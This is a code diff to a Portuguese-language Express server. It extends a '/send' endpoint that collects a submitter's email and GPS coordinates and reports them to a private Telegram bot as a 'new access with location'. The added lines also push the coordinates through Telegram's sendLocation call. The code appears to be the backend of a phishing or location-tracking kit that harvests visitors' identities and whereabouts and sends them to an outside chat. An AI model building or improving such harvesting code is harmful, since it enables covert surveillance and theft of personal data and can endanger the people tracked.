@@ -33,6 +33,7 @@ app.post('/send', async (req, res) => {
   const lng = req.body.lng || 'desconhecido';
 
   const mensagem = `Novo acesso com localização:\n\nEmail: ${email}\nLatitude: ${lat}\nLongitude: ${lng}`;
+  const locationUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendLocation`;
   const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
   try {
@@ -45,9 +46,20 @@ app.post('/send', async (req, res) => {
       })
     });
 
-    const json = await response.json();
+    const loc = await fetch(locationUrl, {
+      method: 'POST',
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        latitude: lat,
+        longitude: lng
+      })
+    });
 
-    if (json.ok) {
+    const json = await response.json();
+    const locationjson = await loc.json();
+
+    if (json.ok && locationjson.ok) {
       res.send("<h3>Obrigado! Seus dados foram recebidos.</h3>");
     } else {
       res.status(500).send("Erro ao enviar para o Telegram.");
